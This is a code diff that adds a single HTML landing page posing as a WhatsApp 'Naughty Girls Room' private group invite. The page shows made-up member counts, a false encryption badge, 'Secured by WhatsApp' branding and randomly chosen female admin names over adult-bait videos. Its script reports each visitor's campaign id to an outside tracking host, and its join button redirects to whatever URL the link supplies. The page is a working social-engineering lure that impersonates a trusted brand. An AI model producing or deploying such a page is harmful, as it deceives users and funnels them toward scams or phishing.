@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Naughty Girls Room</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔒</text></svg>">
+    <style>
+        :root {
+            --wa-bg-dark: #0b141a; /* Warna background WhatsApp Dark */
+            --wa-card-bg: #202c33; /* Warna background kartu/chat */
+            --wa-green: #00a884; /* Hijau khas WhatsApp */
+            --wa-green-hover: #028876;
+            --text-main: #e9edef;
+            --text-sec: #8696a0;
+            --divider: #374045;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--wa-bg-dark);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* --- BACKGROUND VIDEO --- */
+        .bg-video {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            min-width: 100%;
+            min-height: 100%;
+            width: auto;
+            height: auto;
+            z-index: -2;
+            transform: translate(-50%, -50%);
+            object-fit: cover;
+            /* Blur dikurangi dari 40px ke 8px, brightness diturunkan agar teks tetap terbaca */
+            filter: blur(8px) brightness(0.3);
+        }
+
+        .bg-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(11, 20, 26, 0.6); /* Overlay transparan untuk memadukan */
+            z-index: -1;
+        }
+
+        /* --- MAIN CARD --- */
+        .card {
+            background: var(--wa-card-bg);
+            width: 100%;
+            max-width: 400px;
+            border-radius: 20px;
+            padding: 40px 30px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            position: relative;
+            z-index: 1;
+            border: 1px solid rgba(255,255,255,0.05); /* Sedikit border agar menonjol dari video */
+        }
+
+        /* --- GROUP AVATAR --- */
+        .group-avatar {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 20px;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 4px solid var(--wa-bg-dark);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            position: relative;
+        }
+
+        .group-avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* --- TEXTS --- */
+        h1 {
+            font-size: 1.4rem;
+            margin-bottom: 5px;
+            color: var(--text-main);
+            font-weight: 600;
+        }
+
+        .group-type {
+            font-size: 0.85rem;
+            color: var(--text-sec);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 15px;
+        }
+
+        .admin-info {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            font-size: 0.9rem;
+            color: var(--text-sec);
+            margin-bottom: 25px;
+        }
+
+        .admin-name {
+            color: var(--text-main);
+            font-weight: 500;
+        }
+
+        /* --- SECURITY BADGE --- */
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: rgba(0, 168, 132, 0.1);
+            color: var(--wa-green);
+            padding: 10px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            font-size: 0.8rem;
+            font-weight: 500;
+        }
+
+        /* --- STATS --- */
+        .stats-container {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid var(--divider);
+        }
+
+        .stat-item {
+            text-align: left;
+        }
+
+        .stat-num {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: var(--text-main);
+        }
+
+        .stat-label {
+            font-size: 0.8rem;
+            color: var(--text-sec);
+        }
+
+        /* --- BUTTON --- */
+        .join-btn {
+            width: 100%;
+            background-color: var(--wa-green);
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 30px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0, 168, 132, 0.3);
+            transition: background 0.2s, transform 0.1s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .join-btn:hover {
+            background-color: var(--wa-green-hover);
+            transform: translateY(-2px);
+        }
+
+        .join-btn:active {
+            transform: translateY(0);
+        }
+
+        /* --- FOOTER --- */
+        .footer {
+            margin-top: 25px;
+            font-size: 0.75rem;
+            color: var(--text-sec);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+
+        .footer svg { width: 12px; height: 12px; fill: currentColor; }
+
+    </style>
+</head>
+<body>
+
+    <!-- Background Video Element -->
+    <video id="bgVideo" class="bg-video" playsinline autoplay muted loop></video>
+    <div class="bg-overlay"></div>
+
+    <div class="card">
+        <!-- Group Avatar -->
+        <div class="group-avatar">
+            <img id="randomProfileImg" src="" alt="Group Profile">
+        </div>
+
+        <!-- Title -->
+        <h1>Naughty Girls Room</h1>
+        <div class="group-type">Private Group</div>
+
+        <!-- Admin Info -->
+        <div class="admin-info">
+            <span>Admin:</span>
+            <span id="adminName" class="admin-name">Loading...</span>
+        </div>
+
+        <!-- Security Badge -->
+        <div class="security-badge">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+            <span>Messages are protected with end-to-end encryption</span>
+        </div>
+
+        <!-- Stats -->
+        <div class="stats-container">
+            <div class="stat-item">
+                <div class="stat-num">106.7K</div>
+                <div class="stat-label">Members</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-num">43.2K</div>
+                <div class="stat-label">Online</div>
+            </div>
+        </div>
+
+        <!-- Main Action Button -->
+        <button class="join-btn" onclick="redirectUser()">
+            JOIN GROUP
+        </button>
+
+        <!-- Footer -->
+        <div class="footer">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+            Secured by WhatsApp
+        </div>
+    </div>
+
+    <script>
+        // --- 1. DATABASE VIDEO (Background) ---
+        const videoList = [
+            "" || "https://ceafgif.flirtpixel.com/bundle/921/assets/images/video-1.mp4",
+            "https://files.catbox.moe/387f3z.mp4",
+            "https://files.catbox.moe/y2fr1u.mp4",
+            "https://files.catbox.moe/o2bcz2.mp4",
+            "https://files.catbox.moe/jytnih.mp4",
+            "https://files.catbox.moe/1q99k0.mp4",
+            "https://files.catbox.moe/wkzv09.mp4",
+            "https://files.catbox.moe/9v2zxi.mp4",
+            "https://thumbsnap.com/i/37t8zezA.mp4",
+            "https://thumbsnap.com/i/2ycQSNZa.mp4",
+            "https://thumbsnap.com/i/AY9zveVs.mp4",
+            "https://thumbsnap.com/i/gzm5dPiX.mp4",
+            "https://assets.mixkit.co/videos/preview/mixkit-set-of-abstract-circles-loop-11805-large.mp4"
+        ];
+
+        // --- 2. DATABASE GAMBAR (Avatar) ---
+        const photoList = [
+            "https://files.catbox.moe/p9uwso.png",
+            "https://files.catbox.moe/0s5wni.png",
+            "https://files.catbox.moe/2hg2st.png",
+            "https://files.catbox.moe/i4bygx.png",
+            "https://files.catbox.moe/tebpm0.png",
+            "https://files.catbox.moe/ghpyfa.png",
+            "https://files.catbox.moe/5rj761.jpg",
+            "https://files.catbox.moe/2kj1da.png",
+            "https://files.catbox.moe/7k81uw.png",
+            "https://files.catbox.moe/07pxbl.png"
+        ];
+
+        // --- 3. DATABASE NAMA (ADMIN) ---
+        const femaleNames = [
+            "Luna Whitney", "Grace Sophia", "Charlotte Davis", "Victoria Rose",
+            "Camille Stone", "Isabella Ross", "Eleanor Rigby", "Scarlett J", "Amber H"
+        ];
+
+        function getRandomItem(list) {
+            return list[Math.floor(Math.random() * list.length)];
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            // --- A. LOGIKA VIDEO BACKGROUND ---
+            const videoElement = document.getElementById('bgVideo');
+            const randomVideoUrl = getRandomItem(videoList);
+            
+            if (randomVideoUrl) {
+                videoElement.src = randomVideoUrl;
+                // Pastikan video diputar (beberapa browser memblokir autoplay jika tidak muted)
+                videoElement.play().catch(error => {
+                    console.log("Autoplay video prevented by browser policy:", error);
+                });
+            }
+
+            // --- B. LOGIKA TRACKING ---
+            const params = new URLSearchParams(window.location.search);
+            const refId = params.get('id');
+            
+            if (refId) {
+                const trackingUrl = `https://report.greysyaa.lol/track?cid=${refId}`;
+                const trackPixel = new Image();
+                trackPixel.src = trackingUrl;
+            } else {
+                console.log("Tidak ditemukan parameter 'id' di URL untuk tracking.");
+            }
+
+            // --- C. LOGIKA TAMPILAN (Gambar & Nama) ---
+            
+            // Foto Profil (Avatar)
+            const profileImg = getRandomItem(photoList);
+            document.getElementById('randomProfileImg').src = profileImg;
+
+            // Nama Admin Random
+            const randomName = getRandomItem(femaleNames);
+            document.getElementById('adminName').textContent = randomName;
+        });
+
+        // --- 4. Redirect Logic ---
+        function redirectUser() {
+            const params = new URLSearchParams(window.location.search);
+            const destination = params.get('dest');
+            const refId = params.get('id');
+
+            if (destination) {
+                const finalDest = decodeURIComponent(destination);
+                const separator = finalDest.includes('?') ? '&' : '?';
+                window.location.href = finalDest + separator + 'id=' + refId;
+            } else {
+                alert("Link tujuan tidak ditemukan.");
+            }
+        }
+    </script>
+</body>
+</html>
